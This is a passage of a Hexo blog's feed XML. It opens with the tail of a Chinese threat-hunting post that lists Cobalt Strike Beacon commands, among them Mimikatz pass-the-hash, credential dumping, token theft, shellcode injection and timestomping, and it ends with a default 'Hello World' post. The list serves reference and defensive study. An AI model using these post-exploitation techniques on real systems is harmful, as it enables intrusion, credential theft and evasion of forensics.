PowerShell执行命令</span><br><span class="line"> powershell 通过powershell.exe执行命令</span><br><span class="line"> powershell-import 导入powershell脚本</span><br><span class="line"> ppid Set parent PID for spawned post-ex jobs</span><br><span class="line"> ps 显示进程列表</span><br><span class="line"> p**ec Use a service to spawn a session on a host</span><br><span class="line"> p**ec_psh Use PowerShell to spawn a session on a host</span><br><span class="line"> psinject 在特定进程中执行PowerShell命令</span><br><span class="line"> pth 使用Mimikatz进行传递哈希</span><br><span class="line"> pwd 当前目录位置</span><br><span class="line"> reg Query the registry</span><br><span class="line"> rev2self 恢复原始令牌</span><br><span class="line"> rm 删除文件或文件夹</span><br><span class="line"> rportfwd 端口转发</span><br><span class="line"> run 在目标上执行程序(返回输出)</span><br><span class="line"> runas 以另一个用户权限执行程序</span><br><span class="line"> runasadmin 在高权限下执行程序</span><br><span class="line"> runu Execute a program under another PID</span><br><span class="line"> screenshot 屏幕截图</span><br><span class="line"> setenv 设置环境变量</span><br><span class="line"> shell cmd执行命令</span><br><span class="line"> shinject 将shellcode注入进程</span><br><span class="line"> shspawn 生成进程并将shellcode注入其中</span><br><span class="line"> sleep 设置睡眠延迟时间</span><br><span class="line"> socks 启动SOCKS4代理</span><br><span class="line"> socks stop 停止SOCKS4</span><br><span class="line"> spawn Spawn a session </span><br><span class="line"> spawnas Spawn a session as another user</span><br><span class="line"> spawnto Set executable to spawn processes into</span><br><span class="line"> spawnu Spawn a session under another PID</span><br><span class="line"> ssh 使用ssh连接远程主机</span><br><span class="line"> ssh-key 使用密钥连接远程主机</span><br><span class="line"> steal_token 从进程中窃取令牌</span><br><span class="line"> timestomp 将一个文件时间戳应用到另一个文件</span><br><span class="line"> unlink Disconnect from parent Beacon</span><br><span class="line"> upload 上传文件</span><br><span class="line"> wdigest 使用mimikatz转储明文凭据</span><br><span class="line"> winrm 使用WinRM在主机上生成会话</span><br><span class="line"> wmi 使用WMI在主机上生成会话</span><br><span class="line"> argue 进程参数欺骗</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h2 id=&quot;1-Cobalt-Strike-简介&quot;&gt;&lt;a href=&quot;#1-Cobalt-Strike-简介&quot; class=&quot;headerlink&quot; title=&quot;1.Cobalt Strike 简介&quot;&gt;&lt;/a&gt;1.Cobalt Strike 简介&lt;</summary>
      
    
    
    
    <category term="威胁猎捕" scheme="http://example.com/categories/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/"/>
    
    <category term="Cobalt Strike" scheme="http://example.com/categories/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt-Strike/"/>
    
    
    <category term="Cobalt Strike" scheme="http://example.com/tags/Cobalt-Strike/"/>
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="http://example.com/wiki/hello-world/"/>
    <id>http://example.com/wiki/hello-world/</id>
    <published>2021-06-28T11:10:07.606Z</published>
    <updated>1985-10-26T08:15:00.000Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.io/docs/&quot;&gt;documentation&lt;/a&gt; for</summary>
      
    
    
    
    
  </entry>
  
</feed>
